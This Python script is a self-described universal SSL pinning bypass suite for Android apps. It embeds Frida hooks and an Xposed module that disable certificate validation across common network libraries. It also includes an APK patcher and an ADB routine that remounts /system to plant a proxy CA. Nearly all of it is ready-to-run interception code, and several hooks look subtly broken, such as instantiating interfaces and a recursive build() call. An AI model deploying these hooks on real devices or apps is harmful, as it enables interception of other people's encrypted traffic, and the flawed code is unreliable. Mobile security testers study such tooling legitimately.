#!/usr/bin/env python3
"""
Universal SSL Pinning Bypass Suite
For authorized security testing only.
Attempts multiple bypass techniques in sequence.
"""

import sys
import os
import subprocess
import json
import time
import tempfile
import shutil
import re
from pathlib import Path

# ============================================================
# TECHNIQUE 1: Frida-based bypass (most comprehensive)
# ============================================================

FRIDA_SCRIPT_MULTI = """
// Universal SSL Pinning Bypass - Multi-Technique
// Covers: OkHttp, TrustManager, NSURLSession, AFNetworking, Alamofire, etc.

// --- Technique A: Hook all TrustManager implementations ---
Java.perform(function() {
    console.log("[*] Technique A: Hooking TrustManager (Android)");
    
    var TrustManager = Java.use('javax.net.ssl.TrustManager');
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var HttpsURLConnection = Java.use('javax.net.ssl.HttpsURLConnection');
    
    var ArrayType = Java.array('x509', [java.security.cert.X509Certificate]);
    
    // Hook checkClientTrusted
    X509TrustManager.checkClientTrusted.implementation = function(chain, authType) {
        console.log("[+] Bypassed checkClientTrusted");
        return;
    };
    
    // Hook checkServerTrusted
    X509TrustManager.checkServerTrusted.implementation = function(chain, authType) {
        console.log("[+] Bypassed checkServerTrusted");
        return;
    };
    
    // Hook getAcceptedIssuers
    X509TrustManager.getAcceptedIssuers.implementation = function() {
        console.log("[+] Bypassed getAcceptedIssuers");
        return [];
    };
    
    // Hook HttpsURLConnection.setDefaultHostnameVerifier
    var HostnameVerifier = Java.use('javax.net.ssl.HostnameVerifier');
    HostnameVerifier.verify.implementation = function(hostname, session) {
        console.log("[+] Bypassed HostnameVerifier for: " + hostname);
        return true;
    };
    
    // Hook SSLSocketFactory
    var SSLSocketFactory = Java.use('javax.net.ssl.SSLSocketFactory');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    SSLContext.init.implementation = function(km, tm, rm) {
        console.log("[+] SSLContext.init hooked - injecting trust-all TM");
        if (tm !== null) {
            var AllTrusting = Java.use('javax.net.ssl.X509TrustManager');
            var trustAll = AllTrusting.$new();
            this.init(km, [trustAll], rm);
        } else {
            this.init(km, tm, rm);
        }
    };
});

// --- Technique B: OkHttp specific ---
Java.perform(function() {
    console.log("[*] Technique B: Hooking OkHttp");
    
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Builder = Java.use('okhttp3.OkHttpClient$Builder');
        
        Builder.hostnameVerifier.implementation = function(hostnameVerifier) {
            console.log("[+] OkHttp hostnameVerifier set - intercepting");
            return this;
        };
        
        Builder.sslSocketFactory.implementation = function(sslSocketFactory, trustManager) {
            console.log("[+] OkHttp sslSocketFactory set - intercepting");
            return this;
        };
        
        Builder.build.implementation = function() {
            console.log("[+] OkHttpClient.build() - injecting trust-all socket factory");
            var TrustAllCerts = Java.use('javax.net.ssl.X509TrustManager');
            var trustAll = TrustAllCerts.$new();
            
            var SSLContext = Java.use('javax.net.ssl.SSLContext');
            var sc = SSLContext.getInstance("TLS");
            sc.init(null, [trustAll], null);
            
            this.sslSocketFactory(sc.getSocketFactory(), trustAll);
            this.hostnameVerifier(Java.use('javax.net.ssl.HostnameVerifier').$new().verify.implementation = function(a, b) { return true; });
            
            return this.build();
        };
    } catch(e) {
        console.log("[-] OkHttp not found: " + e);
    }
});

// --- Technique C: Hooking CertificatePinner (OkHttp3) ---
Java.perform(function() {
    console.log("[*] Technique C: Bypassing CertificatePinner");
    
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        
        CertificatePinner.check.implementation = function(pin, pin2) {
            console.log("[+] CertificatePinner.check bypassed");
            return;
        };
        
        // Also hook the Builder
        var CertPinBuilder = Java.use('okhttp3.CertificatePinner$Builder');
        CertPinBuilder.add.implementation = function(pattern, pins) {
            console.log("[+] CertificatePinner.add() intercepted - NOT adding pin");
            return this;
        };
        
        CertPinBuilder.build.implementation = function() {
            console.log("[+] CertificatePinner.build() returning empty");
            return Java.use('okhttp3.CertificatePinner').$new();
        };
    } catch(e) {
        console.log("[-] CertificatePinner not found: " + e);
    }
});

// --- Technique D: Hooking WebView SSL handling ---
Java.perform(function() {
    console.log("[*] Technique D: Hooking WebView SSL");
    
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            console.log("[+] WebView SSL error bypassed: " + error);
            handler.proceed();
        };
        
        WebViewClient.onReceivedError.implementation = function(view, request, error) {
            console.log("[*] WebView onReceivedError: " + error);
        };
    } catch(e) {
        console.log("[-] WebView hook failed: " + e);
    }
});

// --- Technique E: Hooking Apache HTTP client ---
Java.perform(function() {
    console.log("[*] Technique E: Hooking Apache HTTP");
    
    try {
        var SchemeRegistry = Java.use('org.apache.http.conn.scheme.SchemeRegistry');
        var SSLSocketFactory_apache = Java.use('org.apache.http.conn.ssl.SSLSocketFactory');
        
        SSLSocketFactory_apache.createSocket.implementation = function() {
            console.log("[+] Apache SSL socket created with bypass");
            var sc = Java.use('javax.net.ssl.SSLContext').getInstance("TLS");
            sc.init(null, Java.array('javax.net.ssl.TrustManager', [Java.use('javax.net.ssl.X509TrustManager').$new()]), null);
            return sc.getSocketFactory().createSocket();
        };
    } catch(e) {
        console.log("[-] Apache HTTP not found: " + e);
    }
});

// --- Technique F: Hooking AsyncHttpClient (AndroidAsync) ---
Java.perform(function() {
    console.log("[*] Technique F: Hooking AndroidAsync");
    
    try {
        var AsyncSSL = Java.use('com.koushikdutta.async.ssl.SSLUTls');
        if (AsyncSSL) {
            AsyncSSL.createCertificate.implementation = function() {
                console.log("[+] AndroidAsync SSL bypassed");
                return null;
            };
        }
    } catch(e) {}
});

// --- Technique G: Hooking Volley ---
Java.perform(function() {
    console.log("[*] Technique G: Hooking Volley");
    
    try {
        var HurlStack = Java.use('com.android.volley.toolbox.HurlStack');
        HurlStack.createConnection.implementation = function() {
            console.log("[+] Volley connection bypassed");
            var url = Java.use('java.net.URL').$new("https://localhost");
            var conn = url.openConnection();
            return conn;
        };
    } catch(e) {}
});

// --- Technique H: Runtime monkey-patching of network_security_config ---
Java.perform(function() {
    console.log("[*] Technique H: Network Security Config bypass");
    
    try {
        var NetworkSecurityConfig = Java.use('android.security.net.config.NetworkSecurityConfig');
        NetworkSecurityConfig.isCleartextTrafficPermitted.implementation = function() {
            return true;
        };
    } catch(e) {}
});

console.log("[✓] All SSL pinning bypass techniques loaded");
"""


# ============================================================
# TECHNIQUE 2: Objection (Frida-based) automated bypass
# ============================================================

OBJECTION_COMMANDS = """
android sslpinning disable
android root disable
"""


# ============================================================
# TECHNIQUE 3: Xposed module approach
# ============================================================

XPOSED_BYPASS_CODE = """
// Xposed Module SSL Pinning Bypass
package com.hackerai.sslpinningbypass;

import de.robv.android.xposed.*;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import de.robv.android.xposed.XposedHelpers;
import javax.net.ssl.*;
import java.security.cert.X509Certificate;
import java.security.cert.CertificateException;

public class SSLUnpinning implements IXposedHookLoadPackage {
    
    private static TrustManager[] getTrustAllManagers() {
        return new TrustManager[] {
            new X509ExtendedTrustManager() {
                public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                public void checkServerTrusted(X509Certificate[] chain, String authType) {}
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                public void checkClientTrusted(X509Certificate[] chain, String authType, java.net.Socket socket) {}
                public void checkServerTrusted(X509Certificate[] chain, String authType, java.net.Socket socket) {}
                public void checkClientTrusted(X509Certificate[] chain, String authType, SSLEngine engine) {}
                public void checkServerTrusted(X509Certificate[] chain, String authType, SSLEngine engine) {}
            }
        };
    }
    
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        if (lpparam.packageName.equals("com.android.systemui")) return;
        
        XposedBridge.log("[SSLUnpin] Hooked: " + lpparam.packageName);
        
        // Hook X509TrustManager
        try {
            Class<?> tmClass = XposedHelpers.findClass("javax.net.ssl.X509TrustManager", lpparam.classLoader);
            XposedHelpers.findAndHookMethod(tmClass, "checkServerTrusted", 
                X509Certificate[].class, String.class, new XC_MethodReplacement() {
                    @Override
                    protected Object replaceHookedMethod(MethodHookParam param) { return null; }
                });
            XposedBridge.log("[SSLUnpin] X509TrustManager hooked");
        } catch (Exception e) {}
        
        // Hook SSLContext.init
        try {
            XposedHelpers.findAndHookMethod("javax.net.ssl.SSLContext", lpparam.classLoader,
                "init", KeyManager[].class, TrustManager[].class, java.security.SecureRandom.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) {
                        param.args[1] = getTrustAllManagers();
                        XposedBridge.log("[SSLUnpin] SSLContext.init intercepted");
                    }
                });
        } catch (Exception e) {}
        
        // Hook WebView SSL errors
        try {
            XposedHelpers.findAndHookMethod("android.webkit.WebViewClient", lpparam.classLoader,
                "onReceivedSslError", 
                android.webkit.WebView.class, 
                android.webkit.SslErrorHandler.class, 
                android.net.http.SslError.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) {
                        android.webkit.SslErrorHandler handler = (android.webkit.SslErrorHandler) param.args[1];
                        handler.proceed();
                        XposedBridge.log("[SSLUnpin] WebView SSL error bypassed");
                    }
                });
        } catch (Exception e) {}
        
        // Hook OkHttp3 CertificatePinner
        try {
            Class<?> certPinClass = XposedHelpers.findClass("okhttp3.CertificatePinner", lpparam.classLoader);
            XposedHelpers.findAndHookMethod(certPinClass, "check", 
                String.class, java.util.List.class,
                new XC_MethodReplacement() {
                    @Override
                    protected Object replaceHookedMethod(MethodHookParam param) { return null; }
                });
            XposedBridge.log("[SSLUnpin] OkHttp CertificatePinner hooked");
        } catch (Exception e) {}
        
        // Hook OkHttp Builder
        try {
            Class<?> builderClass = XposedHelpers.findClass("okhttp3.OkHttpClient$Builder", lpparam.classLoader);
            XposedHelpers.findAndHookMethod(builderClass, "certificatePinner",
                XposedHelpers.findClass("okhttp3.CertificatePinner", lpparam.classLoader),
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) {
                        param.args[0] = null;
                        XposedBridge.log("[SSLUnpin] OkHttp CertificatePinner nulled");
                    }
                });
        } catch (Exception e) {}
    }
}
"""


# ============================================================
# TECHNIQUE 4: AndroidManifest.xml network security config override
# ============================================================

NETWORK_SECURITY_CONFIG_XML = """<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">localhost</domain>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </domain-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="user" />
            <certificates src="system" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
"""


# ============================================================
# TECHNIQUE 5: ADB proxy + mitmproxy config
# ============================================================

ADB_PROXY_SCRIPT = """#!/bin/bash
# ADB Proxy + mitmproxy setup for SSL bypass

PROXY_PORT=8080
DEVICE_PORT=8080

echo "[*] Starting mitmproxy..."
mitmproxy --listen-port $PROXY_PORT &
MITM_PID=$!
sleep 2

echo "[*] Setting ADB proxy..."
adb shell settings put global http_proxy localhost:$DEVICE_PORT
adb reverse tcp:$DEVICE_PORT tcp:$PROXY_PORT

echo "[*] Installing mitmproxy CA..."
adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/
adb shell "mount -o rw,remount /system 2>/dev/null; \
    cp /sdcard/mitmproxy-ca-cert.cer /system/etc/security/cacerts/; \
    chmod 644 /system/etc/security/cacerts/mitmproxy-ca-cert.cer; \
    mount -o ro,remount /system 2>/dev/null; \
    reboot"
echo "[+] Device will reboot. Reconnect and proxy will work."
"""


# ============================================================
# MAIN AUTOMATED BYPASS SCRIPT
# ============================================================

def check_dependencies():
    """Check required tools are installed."""
    deps = {
        'frida': False,
        'frida-server': False,
        'objection': False,
        'adb': False,
        'apktool': False,
        'jarsigner': False,
        'keytool': False,
    }
    
    print("[*] Checking dependencies...")
    
    for tool in deps:
        try:
            subprocess.run(['which', tool], capture_output=True, check=True)
            deps[tool] = True
            print(f"  [+] {tool} found")
        except:
            print(f"  [-] {tool} not found")
    
    return deps


def frida_spawn_bypass(package_name, host='127.0.0.1', port=27042):
    """Spawn the app with Frida and inject universal bypass."""
    print(f"\n{'='*60}")
    print("[*] TECHNIQUE 1: Frida Spawn + Universal Bypass")
    print(f"{'='*60}")
    
    # Write script to temp file
    with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
        f.write(FRIDA_SCRIPT_MULTI)
        script_path = f.name
    
    print(f"[*] Injecting Frida script into {package_name}...")
    
    cmd = [
        'frida', '-U' if host == '127.0.0.1' else f'-H{host}:{port}',
        '-f', package_name,
        '-l', script_path,
        '--no-pause'
    ]
    
    print(f"[*] Running: {' '.join(cmd)}")
    print("[*] Press Ctrl+C to stop...\n")
    
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
    finally:
        os.unlink(script_path)


def frida_attach_bypass(package_name, host='127.0.0.1', port=27042):
    """Attach to running app with Frida."""
    print(f"\n{'='*60}")
    print("[*] TECHNIQUE 1b: Frida Attach + Universal Bypass")
    print(f"{'='*60}")
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
        f.write(FRIDA_SCRIPT_MULTI)
        script_path = f.name
    
    cmd = [
        'frida', '-U' if host == '127.0.0.1' else f'-H{host}:{port}',
        package_name,
        '-l', script_path
    ]
    
    print(f"[*] Running: {' '.join(cmd)}")
    
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
    finally:
        os.unlink(script_path)


def objection_bypass(package_name):
    """Use Objection for automated SSL pinning bypass."""
    print(f"\n{'='*60}")
    print("[*] TECHNIQUE 2: Objection Automated Bypass")
    print(f"{'='*60}")
    
    print("[*] Running: objection -g " + package_name + " explore")
    print("[*] Once inside Objection shell, run:")
    for cmd in OBJECTION_COMMANDS.strip().split('\n'):
        print(f"    {cmd}")
    
    try:
        subprocess.run(['objection', '-g', package_name, 'explore'])
    except KeyboardInterrupt:
        print("\n[*] Interrupted")


def apk_patch_network_security(apk_path, output_dir='patched_apk'):
    """Patch the APK to disable network security config."""
    print(f"\n{'='*60}")
    print("[*] TECHNIQUE 3: APK Patching - Network Security Config")
    print(f"{'='*60}")
    
    # Decompile APK
    print(f"[*] Decompiling {apk_path}...")
    decompile_cmd = ['apktool', 'd', '-f', '-o', output_dir, apk_path]
    subprocess.run(decompile_cmd, check=True)
    
    # Write network_security_config.xml
    res_xml_dir = os.path.join(output_dir, 'res', 'xml')
    os.makedirs(res_xml_dir, exist_ok=True)
    ns_config_path = os.path.join(res_xml_dir, 'network_security_config.xml')
    with open(ns_config_path, 'w') as f:
        f.write(NETWORK_SECURITY_CONFIG_XML)
    print(f"[+] Written: {ns_config_path}")
    
    # Patch AndroidManifest.xml
    manifest_path = os.path.join(output_dir, 'AndroidManifest.xml')
    with open(manifest_path, 'r') as f:
        manifest = f.read()
    
    # Add network security config attribute if not present
    if 'networkSecurityConfig' not in manifest:
        manifest = manifest.replace(
            '<application ',
            '<application android:networkSecurityConfig="@xml/network_security_config" '
        )
    else:
        # Replace existing with our config
        manifest = re.sub(
            r'android:networkSecurityConfig="@[^"]+"',
            'android:networkSecurityConfig="@xml/network_security_config"',
            manifest
        )
    
    # Add debuggable flag
    if 'android:debuggable="true"' not in manifest:
        manifest = manifest.replace(
            '<application ',
            '<application android:debuggable="true" '
        )
    
    with open(manifest_path, 'w') as f:
        f.write(manifest)
    print(f"[+] Patched: {manifest_path}")
    
    # Rebuild
    print("[*] Rebuilding APK...")
    rebuild_cmd = ['apktool', 'b', '-o', 'patched.apk', output_dir]
    subprocess.run(rebuild_cmd, check=True)
    print("[+] Built: patched.apk")
    
    # Sign the APK
    print("[*] Signing APK...")
    sign_cmd = [
        'jarsigner', '-sigalg', 'SHA1withRSA',
        '-digestalg', 'SHA1',
        '-keystore', os.path.expanduser('~/.android/debug.keystore'),
        '-storepass', 'android',
        '-keypass', 'android',
        'patched.apk',
        'androiddebugkey'
    ]
    subprocess.run(sign_cmd, check=True)
    print("[+] Signed: patched.apk")
    
    # Zipalign
    print("[*] Aligning APK...")
    align_cmd = ['zipalign', '-v', '-p', '4', 'patched.apk', 'patched_aligned.apk']
    subprocess.run(align_cmd, check=True)
    print("[+] Aligned: patched_aligned.apk")
    
    print("\n[✓] Patched APK ready: patched_aligned.apk")
    print("[*] Install with: adb install -r patched_aligned.apk")


def install_frida_server(arch=None):
    """Attempt to install frida-server on device."""
    print(f"\n{'='*60}")
    print("[*] TECHNIQUE: Install Frida Server on Device")
    print(f"{'='*60}")
    
    if not arch:
        # Detect architecture
        result = subprocess.run(['adb', 'shell', 'getprop', 'ro.product.cpu.abi'],
                              capture_output=True, text=True)
        arch = result.stdout.strip()
        print(f"[*] Detected architecture: {arch}")
    
    # Map to frida arch names
    arch_map = {
        'arm64-v8a': 'arm64',
        'armeabi-v7a': 'arm',
        'x86': 'x86',
        'x86_64': 'x86_64',
    }
    
    frida_arch = arch_map.get(arch)
    if not frida_arch:
        print(f"[-] Unknown architecture: {arch}")
        return False
    
    # Get latest frida version
    result = subprocess.run(['frida', '--version'], capture_output=True, text=True)
    version = result.stdout.strip()
    print(f"[*] Frida version: {version}")
    
    # Download frida-server
    frida_server_url = f"https://github.com/frida/frida/releases/download/{version}/frida-server-{version}-android-{frida_arch}.xz"
    local_xz = f"frida-server-{version}-android-{frida_arch}.xz"
    
    print(f"[*] Downloading: {frida_server_url}")
    subprocess.run(['wget', '-q', frida_server_url, '-O', local_xz], check=True)
    
    # Extract
    subprocess.run(['xz', '-d', local_xz], check=True)
    frida_binary = local_xz.replace('.xz', '')
    
    # Push to device
    print("[*] Pushing to device...")
    subprocess.run(['adb', 'push', frida_binary, '/data/local/tmp/frida-server'], check=True)
    subprocess.run(['adb', 'shell', 'chmod', '755', '/data/local/tmp/frida-server'], check=True)
    
    # Start frida-server
    print("[*] Starting frida-server (run in another terminal for persistence)...")
    print("    adb shell /data/local/tmp/frida-server &")
    
    # Cleanup
    os.remove(frida_binary)
    print("[+] Frida-server installed successfully")
    return True


def adb_proxy_setup(proxy_ip, proxy_port=8080):
    """Set up ADB proxy for traffic interception."""
    print(f"\n{'='*60}")
    print("[*] TECHNIQUE: ADB Proxy + mitmproxy Setup")
    print(f"{'='*60}")
    
    print(f"[*] Setting proxy to {proxy_ip}:{proxy_port}...")
    
    commands = [
        f'adb shell settings put global http_proxy {proxy_ip}:{proxy_port}',
        f'adb reverse tcp:{proxy_port} tcp:{proxy_port}',
        f'adb shell settings put global http_proxy {proxy_ip}:{proxy_port}',
    ]
    
    for cmd in commands:
        print(f"[*] Running: {cmd}")
        subprocess.run(cmd.split())
    
    print("[*] To install mitmproxy CA cert on device:")
    print("    1. Open browser on device to http://mitm.it")
    print("    2. Download and install the Android certificate")
    print("    OR push manually:")
    print("    adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/")
    print("    Then install from Settings > Security > Install from storage")


def run_all_techniques(package_name=None, apk_path=None):
    """Run all available bypass techniques."""
    print("\n" + "="*60)
    print("  UNIVERSAL SSL PINNING BYPASS SUITE")
    print("  For authorized security testing only")
    print("="*60 + "\n")
    
    deps = check_dependencies()
    
    if package_name:
        print(f"\n[*] Target Package: {package_name}")
    
    if apk_path:
        print(f"[*] Target APK: {apk_path}")
    
    print("\n[*] Available techniques:")
    techniques = [
        ("1. Frida Spawn Bypass", deps.get('frida', False) and deps.get('frida-server', False)),
        ("2. Frida Attach Bypass", deps.get('frida', False)),
        ("3. Objection Bypass", deps.get('objection', False)),
        ("4. APK Patch (Network Security)", deps.get('apktool', False) and deps.get('jarsigner', False)),
        ("5. ADB Proxy Setup", deps.get('adb', False)),
        ("6. Install Frida Server", deps.get('adb', False) and deps.get('frida', False)),
    ]
    
    for name, ready in techniques:
        status = "[READY]" if ready else "[DEPS MISSING]"
        print(f"    {name} {status}")
    
    print("\n" + "="*60)
    print("INTERACTIVE MODE")
    print("="*60)
    
    while True:
        print("\nSelect technique (1-6, 'q' to quit):")
        choice = input("> ").strip()
        
        if choice == 'q':
            break
        
        elif choice == '1' and package_name:
            frida_spawn_bypass(package_name)
        
        elif choice == '2' and package_name:
            frida_attach_bypass(package_name)
        
        elif choice == '3' and package_name:
            objection_bypass(package_name)
        
        elif choice == '4' and apk_path:
            apk_patch_network_security(apk_path)
        
        elif choice == '5':
            ip = input("Enter proxy IP (default: 127.0.0.1): ").strip() or "127.0.0.1"
            port = input("Enter proxy port (default: 8080): ").strip() or "8080"
            adb_proxy_setup(ip, int(port))
        
        elif choice == '6':
            arch = input("Enter device arch (leave blank for auto-detect): ").strip() or None
            install_frida_server(arch)
        
        else:
            print("[-] Invalid choice or missing target info")
    
    print("\n[*] Done. Happy hunting!")


# ============================================================
# STANDALONE FRIDA SCRIPT OUTPUT
# ============================================================

def save_frida_script(output_path='ssl_bypass.js'):
    """Save the standalone Frida script to a file."""
    with open(output_path, 'w') as f:
        f.write(FRIDA_SCRIPT_MULTI)
    print(f"[+] Saved Frida script to: {output_path}")
    print("[*] Usage: frida -U -f com.target.app -l ssl_bypass.js --no-pause")


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Universal SSL Pinning Bypass Suite - Authorized Testing Only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ssl_bypass.py -p com.example.app
  python ssl_bypass.py -p com.example.app -a app.apk
  python ssl_bypass.py --script-only -o bypass.js
  python ssl_bypass.py -p com.example.app --attach
        """
    )
    
    parser.add_argument('-p', '--package', help='Target Android package name')
    parser.add_argument('-a', '--apk', help='Path to APK file for patching')
    parser.add_argument('--attach', action='store_true', help='Attach to running app instead of spawning')
    parser.add_argument('--script-only', action='store_true', help='Only save the Frida script to file')
    parser.add_argument('-o', '--output', default='ssl_bypass.js', help='Output path for Frida script')
    parser.add_argument('--host', default='127.0.0.1', help='Frida host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=27042, help='Frida port (default: 27042)')
    
    args = parser.parse_args()
    
    if args.script_only:
        save_frida_script(args.output)
        sys.exit(0)
    
    if not args.package and not args.apk:
        print("[-] Specify at least --package or --apk")
        print("    Or use --script-only to generate standalone Frida script")
        parser.print_help()
        sys.exit(1)
    
    run_all_techniques(args.package, args.apk)
